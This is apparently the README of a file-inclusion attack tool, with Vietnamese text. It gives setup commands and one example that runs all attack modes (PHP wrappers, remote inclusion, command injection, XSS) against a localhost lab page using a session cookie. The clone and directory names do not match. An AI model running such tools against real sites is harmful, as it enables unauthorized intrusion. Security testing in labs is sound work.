# File_Inclusion

#Setup
git clone https://github.com/tahai211/File_Inclusion.git
cd lfimap
pip3 install -r requirements.txt
python3 lfi.py -h

1. Tất cả các cuộc tấn công (bộ lọc, đầu vào, dữ liệu, mong đợi và trình bao bọc tệp, bao gồm tệp từ xa, chèn lệnh, XSS, tiết lộ lỗi).
   python3 lfi.py -U "http://localhost:9991/FileInclusion/pages/lvl2.php?file=PWN" -C "PHPSESSID=3bb8b36d307f1eceb4c8f4587bb436df"
